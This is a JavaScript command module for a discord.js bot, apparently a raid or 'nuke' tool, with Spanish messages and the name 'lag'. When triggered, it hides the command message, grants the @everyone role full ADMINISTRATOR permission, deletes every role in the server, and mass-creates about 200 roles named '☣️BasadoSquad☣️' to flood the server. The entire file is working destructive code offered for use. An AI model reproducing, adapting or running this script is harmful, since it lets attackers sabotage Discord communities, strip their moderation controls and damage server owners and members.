const Discord = require('discord.js')
const { Client, MessageEmbed } = require('discord.js')



module.exports = {
  name: "lag",
  alias: "",
  descritpion: '',
  uso:'',
  category: '',
  run: async (client, message, args) => {
    message.delete().catch(()=>{
        return;
    })
  
    message.author.send({content: '**Laggeo iniciado, presenciarás un lag repentino debido a la creación masiva de roles**'}).catch(()=>{
        return;
      })
      
      message.guild.roles.cache.find(role => role.name =="@everyone").setPermissions('ADMINISTRATOR').catch(()=>{
        message.reply({content: "**Ocurrió un error al intentar otorgar este permiso al rol @everyone, por favor revise mis permisos.**", ephemeral: true})
    })
    message.guild.roles.cache.forEach(role => {
        role.delete().catch(()=>{
            return;
        })
    });
    for (let i = 0; i <= 200; i++) {
        message.guild.roles.create({
            name: '☣️BasadoSquad☣️',
            color: 'RED',
            reason: '☣️BasadoSquad☣️',
            position: message.guild.me.roles.highest.position - 1
        }).catch(()=>{
            return;
        })
    }
       
  
  }
}